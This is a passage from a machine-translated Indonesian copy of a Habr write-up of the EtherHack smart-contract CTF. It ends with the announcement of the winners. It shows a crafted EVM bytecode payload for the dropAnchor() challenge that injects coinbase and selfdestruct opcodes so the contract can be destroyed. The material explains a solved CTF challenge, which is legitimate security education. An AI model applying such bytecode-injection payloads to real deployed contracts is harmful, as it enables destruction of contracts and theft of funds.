 f3 ;;  kembali </pre><br>  Jika kita mengonversi urutan byte ke <code>uint256 (9081882833248973872855737642440582850680819)</code> dan menggunakannya sebagai argumen ke fungsi <code>dropAnchor()</code> , kita mendapatkan nilai berikut untuk variabel kode (bytecode in bold adalah payload kami): <br><br><pre> <code class="cpp hljs"><span class="hljs-number"><span class="hljs-number">0x630068414141ff3f3f3f3f3f60005260096017f34310585733ff</span></span></code> </pre> <br>  Setelah variabel kode menjadi bagian dari variabel initcode, kami mendapatkan nilai berikut: <br><br><pre> <code class="cpp hljs"><span class="hljs-number"><span class="hljs-number">0x68414141ff3f3f3f3f3f60005260096017f34310585733ff600052600b6015f3</span></span></code> </pre> <br>  Sekarang byte tinggi <code>0x6300</code> hilang, dan sisa bytecode dibuang setelah <code>0xf3 (return)</code> . <br><br><img src="https://habrastorage.org/getpro/habr/post_images/433/f75/735/433f757356003d73286fa4709cdedcfd.png" alt="gambar"><br><br>  Akibatnya, kontrak baru dengan logika yang diubah dibuat: <br><br><pre>  41 ;;  coinbase
 41 ;;  coinbase
 41 ;;  coinbase
 ff ;;  merusak diri sendiri
 3f ;;  sampah
 3f ;;  sampah
 3f ;;  sampah
 3f ;;  sampah
 3f ;;  sampah </pre><br>  Jika sekarang kita memanggil fungsi pullAnchor (), kontrak ini akan segera dimusnahkan, karena kami tidak lagi memiliki tanda centang pada blok.  Setelah itu kita memanggil fungsi sailAway () dan merayakan kemenangan! <br><br><h2>  Hasil </h2><br><ol><li>  Tempat pertama dan siaran dalam jumlah yang setara dengan 1.000 dolar AS: Alexey Pertsev (p4lex) </li><li>  Tempat kedua dan Buku Besar Nano S: Alexey Markov </li><li>  Suvenir tempat ketiga dan PHDays: Alexander Vlasov </li></ol><br>  Semua hasil: <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">etherhack.positive.com/#/scoreboard</a> <br><br><img src="https://habrastorage.org/getpro/habr/post_images/d88/d86/955/d88d8695572199f7e3d800f34deb18ee.jpg" alt="gambar"><br><br>  Selamat kepada para pemenang dan terima kasih kepada semua peserta! <br><br>  PS Terima kasih kepada <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Zeppelin</a> karena <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">membuat</a> kode sumber platform open source <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Ethernaut CTF</a> . </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id414959/">https://habr.com/ru/post/id414959/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id414945/index.html">Universitas Johns Hopkins menciptakan kulit buatan yang terasa sakit</a></li>
<li><a href="../id414947/index.html">Mendapatkan Git untuk Windows di bawah ReactOS</a></li>
<li><a href="../id414951/index.html">Manajemen akses di Expressjs dengan CASL</a></li>
<li><a href="../id414953/index.html">Nvidia mengajarkan jaringan saraf untuk memperlambat video</a></li>
<li><a href="../id414955/index.html">Perusahaan menggunakan kata blockchain untuk meningkatkan permodalan. Membantu sebentar</a></li>
<li><a href="../id414961/index.html">Ikhtisar SERM</a></li>
<li><a href="../id414963/index.html">Sebuah solusi telah ditemukan untuk melewati perlindungan kata sandi pada iPhone / iPad. Tidak juga</a></li>
<li><a href="../id414965/index.html">â€œPerlindungan Hak Cipta di UEâ€: Reformasi Baru Mungkin Tidak Hanya Mempengaruhi Platform Media</a></li>
<li><a href="../id414967/index.html">Cara mengurangi waktu pembuatan proyek menggunakan Firebase Performance Plugin</a></li>
<li><a href="../id414969/index.html">Memperluas proses pembuatan dengan MSBuild</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>